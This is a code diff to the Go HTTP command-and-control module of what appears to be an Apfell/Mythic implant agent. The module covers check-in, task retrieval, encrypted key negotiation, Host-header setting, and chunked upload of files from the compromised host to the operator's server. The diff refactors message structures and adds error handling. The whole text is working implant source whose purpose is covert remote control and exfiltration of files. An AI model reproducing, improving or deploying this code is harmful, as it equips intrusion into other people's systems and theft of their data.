@@ -152,7 +152,6 @@ func (c *C2Default) CheckIn(ip string, pid int, user string, host string) interf
 		_ = c.NegotiateKey()
 	}
 
-	//log.Printf("Sending checkin msg: %#v\n", checkin)
 	raw, _ := json.Marshal(checkin)
 	endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
 	resp = c.htmlPostData(endpoint, raw)
@@ -160,7 +159,7 @@ func (c *C2Default) CheckIn(ip string, pid int, user string, host string) interf
 	// save the apfell id
 	response := structs.CheckInMessageResponse{}
 	err := json.Unmarshal(resp, &response)
-	//log.Printf("Apfell Checkin Response: %#v", response)
+
 	if err != nil {
 		log.Printf("Error in unmarshal:\n %s", err.Error())
 	}
@@ -175,7 +174,7 @@ func (c *C2Default) CheckIn(ip string, pid int, user string, host string) interf
 
 //GetTasking - retrieve new tasks
 func (c *C2Default) GetTasking() interface{} {
-	//log.Printf("Current C2Default config: %+v\n", c)
+
 	url := fmt.Sprintf("%sapi/v%s/agent_message", c.BaseURL, ApiVersion)
 	//request := structs.Msg{}
 	request := structs.TaskRequestMessage{}
@@ -189,7 +188,6 @@ func (c *C2Default) GetTasking() interface{} {
 	}
 
 	rawTask := c.htmlGetData(url, raw)
-	//log.Println("Raw HTMLGetData response: ", string(rawTask))
 
 	task := structs.TaskRequestMessageResponse{}
 	err = json.Unmarshal(rawTask, &task)
@@ -203,19 +201,20 @@ func (c *C2Default) GetTasking() interface{} {
 
 //PostResponse - Post task responses
 func (c *C2Default) PostResponse(task structs.Task, output string) []byte {
-	//log.Printf("Responding to task: %#v\n", task)
+
 	endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
 	return c.postRESTResponse(endpoint, task, []byte(output))
 }
 
 //postRESTResponse - Wrapper to post task responses through the Apfell rest API
 func (c *C2Default) postRESTResponse(urlEnding string, task structs.Task, data []byte) []byte {
+
 	size := len(data)
 	const dataChunk = 512000 //Normal apfell chunk size
 	r := bytes.NewBuffer(data)
 	chunks := uint64(math.Ceil(float64(size) / dataChunk))
 	var retData bytes.Buffer
-
+	//log.Println("Chunks: ", chunks)
 	for i := uint64(0); i < chunks; i++ {
 		dataPart := int(math.Min(dataChunk, float64(int64(size)-int64(i*dataChunk))))
 		dataBuffer := make([]byte, dataPart)
@@ -228,13 +227,14 @@ func (c *C2Default) postRESTResponse(urlEnding string, task structs.Task, data [
 
 		responseMsg := structs.TaskResponseMessage{}
 		responseMsg.Action = "post_response"
-		resp := structs.Response{}
-		resp.Response = dataBuffer
-		resp.TaskID = task.TaskID
-		responseMsg.Responses = make([]structs.Response, 1)
-		responseMsg.Responses[0] = resp
+		responseMsg.Responses = make([]json.RawMessage, 1)
+		responseMsg.Responses[0] = dataBuffer
 
-		dataToSend, _ := json.Marshal(responseMsg)
+		dataToSend, err := json.Marshal(responseMsg)
+		if err != nil {
+			log.Printf("Error marshaling data for postRESTResponse: %s", err.Error())
+			return make([]byte, 0)
+		}
 		ret := c.htmlPostData(urlEnding, dataToSend)
 		retData.Write(ret)
 	}
@@ -245,25 +245,29 @@ func (c *C2Default) postRESTResponse(urlEnding string, task structs.Task, data [
 //htmlPostData HTTP POST function
 func (c *C2Default) htmlPostData(endpoint string, sendData []byte) []byte {
 	url := fmt.Sprintf("%s%s", c.BaseURL, endpoint)
-	//log.Println("Sending POST request to url: ", url)
+
 	// If the AesPSK is set, encrypt the data we send
 	if len(c.AesPSK) != 0 {
 		//log.Printf("Encrypting Post data")
 		sendData = EncryptMessage(sendData, c.AesPSK)
-		//sendData = c.encryptMessage(sendData)
+
 	}
 
 	sendData = append([]byte(c.ApfellID), sendData...) // Prepend the UUID
-	//log.Printf("Raw post data with UUID: %s\n", string(sendData))
+
 	sendData = []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
-	//log.Printf("Base64 encoded post data: %s\n", string(sendData))
-	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(sendData))
+
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(sendData))
+	if err != nil {
+		log.Printf("Error creating new http request: %s", err.Error())
+		return make([]byte, 0)
+	}
 	contentLength := len(sendData)
 	req.ContentLength = int64(contentLength)
 	req.Header.Set("User-Agent", c.UserAgent)
 	// Set the host header if not empty
 	if len(c.HostHeader) > 0 {
-		//req.Header.Set("Host", c.HostHeader)
+
 		req.Host = c.HostHeader
 	}
 
@@ -291,18 +295,17 @@ func (c *C2Default) htmlPostData(endpoint string, sendData []byte) []byte {
 
 	raw, err := base64.StdEncoding.DecodeString(string(body))
 	if err != nil {
-		log.Println("Error decoding data: ", err.Error())
+		log.Println("Error decoding base64 data: ", err.Error())
 		return make([]byte, 0)
 	}
 
-	//log.Printf("Raw response length with UUID: %d", len(raw))
 	enc_raw := raw[36:] // Remove the Payload UUID
-	//log.Printf("Raw response length without UUID: %d", len(enc_raw))
+
 	// if the AesPSK is set and we're not in the midst of the key exchange, decrypt the response
 	if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
 		//log.Printf("Decrypting data")
 		return DecryptMessage(enc_raw, c.AesPSK)
-		//return c.decryptMessage(body)
+
 	}
 
 	return enc_raw
@@ -310,7 +313,7 @@ func (c *C2Default) htmlPostData(endpoint string, sendData []byte) []byte {
 
 //htmlGetData - HTTP GET request for data
 func (c *C2Default) htmlGetData(url string, body []byte) []byte {
-	//log.Println("Sending HTML GET request to url: ", url)
+
 	client := &http.Client{}
 
 	if len(c.AesPSK) > 0 && len(body) > 0 {
@@ -321,7 +324,7 @@ func (c *C2Default) htmlGetData(url string, body []byte) []byte {
 	encbody := base64.StdEncoding.EncodeToString(encapbody)                   // Base64 the body
 	req, err := http.NewRequest("GET", url, bytes.NewBuffer([]byte(encbody))) // Make the new request
 	if err != nil {
-		log.Println("Error completing GET request: ", err.Error())
+		log.Println("Error creating GET request: ", err.Error())
 		return make([]byte, 0)
 	}
 
@@ -372,7 +375,7 @@ func (c *C2Default) NegotiateKey() string {
 	initMessage.Action = "staging_rsa"
 	initMessage.SessionID = sessionID
 	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)
-	log.Printf("RSA Staging message: %#v", initMessage)
+
 	// Encode and encrypt the json message
 	raw, err := json.Marshal(initMessage)
 
@@ -389,7 +392,7 @@ func (c *C2Default) NegotiateKey() string {
 	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
 
 	err = json.Unmarshal(decryptedResponse, &sessionKeyResp)
-	//log.Printf("RSA staging response: %#v", sessionKeyResp)
+
 	if err != nil {
 		log.Printf("Error unmarshaling RsaResponse: %s", err.Error())
 		return ""
@@ -414,22 +417,23 @@ func (c *C2Default) SendFile(task structs.Task, params string) {
 	file, err := os.Open(path)
 
 	if err != nil {
-		tMsg := structs.ThreadMsg{}
-		tMsg.Error = true
-		tMsg.TaskItem = task
-		tMsg.TaskResult = []byte(err.Error())
+		log.Println("Error opening file: ", err.Error())
 		return
 	}
 
 	fi, err := file.Stat()
 	if err != nil {
+		log.Println("Error obtaining file stat: ", err.Error())
 		return
 	}
 
 	size := fi.Size()
 	raw := make([]byte, size)
-	file.Read(raw)
-
+	_, err = file.Read(raw)
+	if err != nil {
+		log.Println("Error reading file: ", err.Error())
+		return
+	}
 	c.SendFileChunks(task, raw)
 }
 
@@ -507,21 +511,27 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte) {
 	chunkResponse := structs.FileDownloadInitialMessage{}
 	chunkResponse.NumChunks = int(chunks)
 	chunkResponse.TaskID = task.TaskID
+	chunkResponse.FullPath = task.Params
 
-	msg, _ := json.Marshal(chunkResponse)
+	msg, err := json.Marshal(chunkResponse)
+	if err != nil {
+		log.Println("Error unmarshaling intial chunk message: ", err.Error())
+	}
 	resp := c.PostResponse(task, string(msg))
 	fileResp := structs.TaskResponseMessageResponse{}
 
-	err := json.Unmarshal(resp, &fileResp)
+	err = json.Unmarshal(resp, &fileResp)
 
 	if err != nil {
 		log.Printf("Error unmarshaling: %s", err.Error())
 		return
 	}
 
-	fileDetails := structs.FileDownloadInitialMessageResponse{}
-	_ = json.Unmarshal(resp, &fileDetails)
+	var fileDetails map[string]interface{}
 
+	if len(fileResp.Responses) > 0 {
+		_ = json.Unmarshal([]byte(fileResp.Responses[0]), &fileDetails)
+	}
 	r := bytes.NewBuffer(fileData)
 	// Sleep here so we don't spam apfell
 	time.Sleep(time.Duration(c.Interval) * time.Second)
@@ -538,25 +548,41 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte) {
 
 		msg := structs.FileDownloadChunkMessage{}
 		msg.ChunkNum = int(i) + 1
-		msg.FileID = fileDetails.FileID
+		msg.FileID = fileDetails["file_id"].(string)
 		msg.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
+		msg.TaskID = task.TaskID
 
-		encmsg, _ := json.Marshal(msg)
-		subResp := structs.Response{}
-		subResp.Response = encmsg
-		subResp.TaskID = task.TaskID
+		encmsg, err := json.Marshal(msg)
+		if err != nil {
+			log.Println("Error Marshaling chunk message: ", err.Error())
+			break
+		}
 		taskResp := structs.TaskResponseMessage{}
-		taskResp.Responses = make([]structs.Response, 1)
-		taskResp.Responses[0] = subResp
-		dataToSend, _ := json.Marshal(taskResp)
+		taskResp.Action = "post_response"
+		taskResp.Responses = make([]json.RawMessage, 1)
+		taskResp.Responses[0] = encmsg
+		dataToSend, err := json.Marshal(taskResp)
+		if err != nil {
+			log.Println("Error marshaling task response message: ", err.Error())
+			break
+		}
 
 		endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion) // TODO: update this for 1.4
 		resp := c.htmlPostData(endpoint, dataToSend)
 		postResp := structs.TaskResponseMessageResponse{}
 
-		_ = json.Unmarshal(resp, &postResp)
+		err = json.Unmarshal(resp, &postResp)
+		if err != nil {
+			log.Println("Error unmarshaling task response message response: ", err.Error())
+			break
+		}
 
-		if !strings.Contains(postResp.Responses[0].Status, "success") {
+		var decResp map[string]interface{}
+		if len(postResp.Responses) > 0 {
+			_ = json.Unmarshal(postResp.Responses[0], &decResp)
+		}
+
+		if !strings.Contains(decResp["status"].(string), "success") {
 			// If the post was not successful, wait and try to send it one more time
 			time.Sleep(time.Duration(c.Interval) * time.Second)
 			resp = c.htmlPostData(endpoint, dataToSend)
@@ -564,5 +590,10 @@ func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte) {
 		time.Sleep(time.Duration(c.Interval) * time.Second)
 	}
 
-	c.PostResponse(task, "file downloaded")
+	final := structs.Response{}
+	final.Completed = true
+	final.TaskID = task.TaskID
+	final.UserOutput = "file downloaded"
+	finalEnc, _ := json.Marshal(final)
+	c.PostResponse(task, string(finalEnc))
 }
